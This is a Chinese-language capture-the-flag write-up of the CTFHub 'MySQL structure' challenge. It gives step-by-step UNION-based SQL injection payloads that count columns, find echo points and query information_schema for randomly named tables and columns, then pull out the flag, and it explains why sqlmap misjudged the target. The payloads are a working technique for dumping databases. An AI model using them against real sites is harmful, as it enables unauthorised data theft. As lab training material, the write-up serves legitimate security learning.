【CTFHub】Web-SQL注入MySQL结构 Writeup

操作者：何芊宏 | 操作日期：2026.9.24 | 分类：CTF | 标签：CTFHub, Web, SQL注入, MySQL结构, 联合查询, information_schema

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SQL注入 / MySQL结构
  • 题目名称：MySQL结构
  • 环境：通过 Open Browser 打开外部浏览器访问靶场环境。
  • 目标：利用注入漏洞，查询系统库 information_schema 获取随机生成的表名与字段名，最终获取 Flag。

2. 解题思路与知识点

本关核心考点：这关与之前靶场最大的不同在于，它的目标表名和字段名并非直接叫 flag，而是随机生成的字符串（例如本次的 dzmpffkhxz 和 mcqdfaiavk）。如果不知道表名和字段名，就无法直接查询数据。因此，必须熟练运用 MySQL 自带的系统库 information_schema。

系统库的作用：在 MySQL 中，information_schema 是一个信息数据库，它保存着关于 MySQL 服务器所维护的所有其他数据库的信息。其中的 tables 表记录了所有表名，columns 表记录了所有字段名。它是我们摸清数据库结构的“户口本”。

为什么本次使用手工联合查询而非 SQLmap：

本次实操中，使用 SQLmap 的 --technique=U 提示无法注入。原因在于 SQLmap 的自动化启发式检测（对比 1=1 与 1=2 的页面差异）被此靶场“只校验语法、不校验结果集”的机制欺骗，触发了误判。这证明了在特定环境中，手工排查依然是不可替代的基础能力。

3. 手工联合查询全流程详细拆解

第一步：探测字段数（列数）

Payload 1： 1 order by 2

Payload 2： 1 order by 3

执行目的：确定当前查询结果集有多少列，以便后续构造正确列数的 union select。

回显结果：Payload 1 页面正常显示数据；Payload 2 页面无数据回显（报错或空白）。

获得信息：确认当前表共有 2 个字段。后续 union select 必须严格对齐 2 列。

第二步：寻找黄金回显点

Payload： -1 union select 1,2

执行目的：利用不存在的 -1 使前半句查询为空，强制页面回显后半句 union select 的结果，从而确定数据输出的具体位置。

回显结果：页面显示 ID: 1，Data: 2。

获得信息：确认第 1 列和第 2 列均为有效回显位。后续查询的库名、表名、字段名、数据都将放入这两个位置（通常放入第 2 列 Data 处展示）。

第三步：查询当前数据库名

Payload： -1 union select 1,database()

执行目的：调用 MySQL 内置函数 database() 获取当前网站使用的数据库名。

回显结果：页面显示 Data: sqli。

获得信息：确认当前数据库名为 sqli。这是后续查询该库下所有表的基础条件。

第四步：查询当前库的所有表名（利用 MySQL 结构）

Payload： -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()

执行目的：查询系统库 information_schema 中的 tables 表，获取当前库（sqli）下所有的表名。group_concat() 用于将多行表名合并为一行显示，避免只显示第一条。

回显结果：页面显示 Data: dzmpffkhxz,news。

获得信息：成功获取库中所有表名。发现目标表名为随机生成的字符串 dzmpffkhxz。另一个表 news 为干扰项。

第五步：查询指定表的字段名（列名）

Payload： -1 union select 1,group_concat(column_name) from information_schema.columns where table_name='dzmpffkhxz'

执行目的：查询系统库 information_schema 中的 columns 表，获取上一步发现的随机表 dzmpffkhxz 中所有的字段名。注意表名需加单引号包裹。

回显结果：页面显示 Data: mcqdfaiavk。

获得信息：确认该表的字段名为随机生成的字符串 mcqdfaiavk。

第六步：提取最终 Flag 数据

Payload： -1 union select 1,mcqdfaiavk from dzmpffkhxz

执行目的：已知表名 dzmpffkhxz 和字段名 mcqdfaiavk，直接从该表查询该字段的具体数据。

回显结果：页面显示 Data: ctfhub{533cc30c96903adbd823e5cc}。

获得信息：成功提取到 Flag，提交至 CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：表名/字段名随机导致 SQLmap 无法直接定位。如果不先查 information_schema，直接写 select flag from flag 会直接报错找不到表。必须按部就班查结构。
  • 坑2：SQLmap 失效与手工排查的价值。工具自动化判定依赖于预设规则。当工具报错无法注入时，不要直接放弃，手工抓包重放，按照 order by -> union select -> 查系统库 的流程逐一验证，才是破局关键。
  • 坑3：环境重置引发结构变化。一旦环境被销毁重开，库名虽然可能不变（sqli），但随机生成的表名和字段名会全部刷新。重开环境后必须重新执行查询表名和字段名的步骤。

5. 知识总结

  • 联合查询注入标准范式：判断类型 -> order by 判断列数 -> -1 union select 1,2 找回显 -> 查库 -> 查表 -> 查字段 -> 查数据。
  • MySQL 系统库查询核心语法：
    • 查所有表名：select group_concat(table_name) from information_schema.tables where table_schema=database()
    • 查指定表字段名：select group_concat(column_name) from information_schema.columns where table_name='随机表名'
  • 工具与原理的关系：理解系统库结构能够应对实战中所有随机表名/字段名的场景，这也是 SQL 注入脱库的基石。工具虽强，但原理才是解决问题的最后防线。
